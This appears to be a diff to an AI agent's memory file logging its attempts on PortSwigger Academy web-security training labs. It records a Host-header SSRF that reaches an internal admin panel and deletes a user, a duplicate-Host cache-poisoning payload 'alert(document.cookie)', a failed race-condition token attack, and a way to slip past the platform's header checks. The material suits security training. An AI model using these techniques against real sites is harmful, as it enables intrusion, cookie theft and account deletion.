@@ -2,8 +2,8 @@
 metadata:
   node_type: memory
 name: "PRS Lab Campaign"
-description: "Batch 45R: 4 stuck browser labs re-attacked - 2 solved (json-parse web messages, Angular sandbox+CSP), 2 stuck with prior conclusions refuted (without-strings HashMap order/no-search no-loop; js-url encoder alphabet); key lesson: focus payloads need a focused document"
-last_updated: 2026-10-07T12:11:12+08:00
+description: "Batch 46: 3 stuck http labs re-attacked - 2 solved (host-header SSRF + cache poisoning, unblocked by the _lab instance cookie that disables the Academy edge's Host/duplicate-header checks), 1 stuck with quantified evidence (260 empty-token confirms all miss)"
+last_updated: 2026-10-07T13:17:05+08:00
 created: 2026-10-06T22:18:05+08:00
 ---
 
@@ -104,4 +104,20 @@ Batch 45R closed (stuck 池 browser 类 4 题:2 solved / 2 stuck)。开工读族
   编码器字母表定到字符级:保留 alnum + `" { } | ^ $ , * / ~ _ - . !`(空格→`+`);编码 `' ; : = @ < > & + ?`;**删除 `( ) [ ]` 反引号 `\` 与所有 `%`**(x=A%25%32%38%25%32%39B → A2829B ⇒ 双重编码路死)。唯一反射点=href 内 JS 单引号串;`"` 可破 HTML 属性但 `=` 被编码 ⇒ 只能注属性名;`&` 被编码 ⇒ 用不了 `&#39;` ⇒ 串不可破不可闭。Chrome 不解码 javascript: URL(复测)。
 - **工具面关键教训(focus 假阴性)**:未聚焦文档里 Chrome 只设 document.activeElement、**不派发 focus 事件** ⇒ ng-focus/autofocus/#id 类载荷全部假阴性。判读前 `browser_suite call Page.bringToFront`(hasFocus→true)同一载荷立刻 fired=true;另 ng-event 对 focus/blur 用 `$applyAsync`,同一次 eval 读副作用也假阴性(下一次 eval 读)。跨源 iframe 判读用 **fetch beacon + exploit server 访问日志**(page_alert 只读顶层 window.__labAlerts,读不到子帧)。
 - 沉淀:records 四条改写(两条 solved / 两条 stuck);沙箱实践笔记更新(orderBy 规则、80 硬限、片段聚焦可用、lab3 四条新证);新原子笔记 `focus 触发载荷判读:先让文档处于聚焦态`;batch-notes.md 追加第 45R 批节。
+
+
+## 2026-10-07
+
+Batch 46 closed (stuck 池 http 类 3 题:2 solved / 1 stuck)。开工先读知识库(host-header-family / writeup-shapes 四题形状 / cache-poisoning 族 / race-conditions 族)+ 项目记忆;题解禁令对 stuck 项解除(未读官方 solution 块);三题实例全部 range_launch --jar ~/.pi-rs/agent/chrome-jar.json 重开。未 git 提交。
+
+**本批最大收获(平台面)**:Academy **边缘**对 Host 头做严格校验——Host ≠ 实例主机 → `403 Client Error: Forbidden`(109B,digest e539ba4b26269526,**不下发 `_lab`**);HTTP/1.0 无 Host / `Host :` / `Host\t:` / 绝对请求行指内网 都不放行;重复头名 → `400 {"error":"Duplicate header names are not allowed"}`(也是边缘)。**带合法 `_lab` 实例 cookie 后全部放行**(`http_session get <inst>/` 即得该 cookie)。判据:**带 `_lab` 下发的 4xx 是 lab app,不带的 4xx 是边缘**。⇒ 一切 host-header / 重复头 / 缓存键分裂类探针**必须带 `_lab`**;无 cookie 的扫(批42R 的「274 次零命中」)是无效否证。已沉淀原子笔记 `academy-edge-lab-cookie-gate`(连入 host-header-family / portswigger-platform-specifics)。
+
+- **solved** `host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing`(实例 0a5c0058…)
+  成文形状成立:`GET https://<lab>/ HTTP/1.1` + `Host: <内网 IP>` + **`_lab`** ⇒ 立刻路由(504 `connecting to 192.168.0.171`)。**新件 `abs_sweep`** 扫 /24 → **192.168.0.170 唯一非 504(302)**;`GET https://<lab>/admin` + `Host: 192.168.0.170` → 内网 admin 面板(3040B,含 `POST /admin/delete` + csrf)→ 带 csrf POST 删 carlos → 302 `Location: /`;横幅 `<h4>Congratulations, you solved the lab!</h4>`。
+- **solved** `host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests`(实例 0aa200e6…h1,exploit 0a99008b…)
+  「重复 Host 被封」只在无 `_lab` 时成立。带 `_lab`:两个 `Host:` 头放行,**缓存按第一个 Host 取键、app 按第二个渲染** ⇒ `Host: <lab>` + `Host: <exploit>` 打到 `/` → X-Cache miss、体 11079B(基线 11080)、`src="//exploit-…/resources/js/tracking.js"`;再 `Host: <lab>` 读 → **X-Cache hit 同一体**。exploit server `STORE responseFile=/resources/js/tracking.js` = `alert(document.cookie);`(Content-Type application/javascript);max-age=30,受害者来访即执行(ACCESS_LOG 两次 Victim UA 取该 JS)⇒ is-solved。反向顺序(`Host: <exploit>` 先)→ 504 `connecting to exploit-…` ⇒ 路由也按第一个 Host。
+- **stuck** `race-conditions/lab-race-conditions-partial-construction`(实例 0a41001c…,邮箱客户端 exploit-0ad60030…/email)
+  新事实:①**邮箱域名白名单**(非 `@ginandjuice.shop` → 页面 `Invalid email address`)⇒ 确认邮件永远读不到,无法做「真 token」控制实验;②`race_send --url2 <confirm> --body2 '' --a N --b M --stagger-ms X --no-cookie-b` 是正确原语:每轮 10-25 个同名 `/register` 稳定 **4-6 个新 INSERT 成功**(200/2636B,其余 3142B 重复页)⇒ register 窗口可达;③但 **6 轮共 260 次** `POST /confirm?token[]=`(CL 0、不带 cookie;stagger 0/60/80/250/350/800;burst 10-25×25-60)**100% `400 "Incorrect token: Array"`**;④`token[][]=&token[]=` → 500 占位符泄漏 ⇒ 数组确实铺进 bind(真的跑 `WHERE token = ''`)。未决面 = 半构造行对其它连接不可见(显式事务未提交)或 token 列默认 NULL;下一手 = 把 confirm 从「一个瞬间齐发」改成「窗口上连续播撒」(缺 spread 件,race_send 只有固定 stagger)。
+- 工具面:新项目件 **`abs_sweep`**(绝对请求行 + `Host: <net>.FUZZ` 并行定时扫,baseline/outliers 口径)——`raw_matrix` 会 trim 头名、`raw_http` 会自动补 Host 造成「重复头」误判层界,只有本件能正确表达该形状;顺手修 `raw_matrix` 编译错(`report::failure` 需 `&str`)。规则:`--send-str`/字节级件用于畸形头名,`raw_matrix` 用于成组形状对比。
+- 沉淀:两条 host-header 实录改 solved(含层界表)、race 实录更新 stuck(260 次量化);batch-notes.md 追加第 46 批节。
 
